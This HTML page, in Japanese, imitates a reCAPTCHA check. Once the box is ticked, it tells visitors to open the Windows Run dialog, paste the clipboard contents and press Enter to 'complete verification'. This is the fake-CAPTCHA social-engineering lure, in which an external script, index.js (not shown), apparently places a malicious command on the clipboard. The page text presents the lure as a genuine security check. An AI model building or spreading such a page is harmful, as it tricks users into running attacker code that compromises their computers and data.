<!DOCTYPE html>
<html>
    <head>      
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" type="image/x-icon" href="./resources/images/favicon.ico">
        <title>ロボットのアクセス取り締まりにご協力ください。</title>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@1.0.4/css/bulma.min.css">
    </head>
    <body>
        <section class="section is-fullheight">
            <div class="container is-flex is-flex-direction-column is-align-items-center" style="transform: translateY(240px);">
                <h1 class="has-text-centered">ロボットのアクセス取り締まりにご協力ください</h1>
                <div class="rect-box" id="captchaBox">
                  <label class="checkbox checkbox-wrap">
                    <input type="checkbox" id="robotCheck">
                    <span class="check-text">私はロボットではありません</span>
                  </label>
                  <img src="./resources/images/recaptcha.png" alt="logo" class="rect-image">
                </div>
            </div>

            <p id="lockedText" class="title locked-text">以下の手順を踏み、認証を完了してください</p>
            <ol id="steps" class="steps-list">
              <li>Windowsキー+Rキーで「実行」を開く</li>
              <li>入力欄にカーソルを当て、Ctrlキー+Vキーで内容を貼り付ける</li>
              <li>OKボタンまたはEnterキーを押して認証を完了</li>
            </ol>
        </section>
        <script src="index.js"></script>
    </body>
</html>

<style>
  .rect-box {
    width: 480px;
    height: 94px;
    border: 2px solid #dbdbdb;
    border-radius: 8px;
    margin-top: 24px;
    background: #303030;
    display: flex;
    align-items: center; 
    justify-content: space-between;
    padding: 0 20px;     
    transition: opacity 0.3s ease, filter 0.3s ease;
  }

  .checkbox-wrap {
    margin-left: 16px;
    display: flex;
    align-items: center;
    gap: 12px;
    color: #f5f5f5;
    font-size: 16px;
  }

  .checkbox-wrap input {
    transform: scale(2.7);
    cursor: pointer;
  }
  
  .check-text {
    margin-left: 10px;
  }

  .rect-image {
    width: 48px;
    height: auto;
    opacity: 1;
    transform: scale(1.6);
  }

  .locked-text {
    margin-top: 270px;
    color: #b5b5b5;
    font-size: 18px;
    text-align: center;
    opacity: 0;
    transform: translateY(-6px);
    transition: opacity 0.3s ease, transform 0.3s ease;
  }

  .locked-text.show {
    opacity: 1;
    transform: translateY(0);
  }

  .rect-box.checked {
    opacity: 0.55;
    filter: grayscale(0.4);
    box-shadow: 0 0 12px rgba(72, 199, 142, 0.6);
  }

  .rect-box.checked .checkbox-wrap input {
    cursor: not-allowed;
  }

  .steps-list {
    margin-top: 12px;
    color: #d0d0d0;
    font-size: 15px;
    line-height: 1.8;
    opacity: 0;
    transform: translateY(14px);
    transition: opacity 0.4s ease, transform 0.4s ease;
    list-style: decimal;
    padding-left: 28px;
    max-width: 520px;
    margin-left: auto;
    margin-right: auto;
    text-align: left;
  }

  .steps-list.show {
    opacity: 1;
    transform: translateY(0);
  }

  .steps-list li {
    margin-bottom: 6px;
  }
</style>
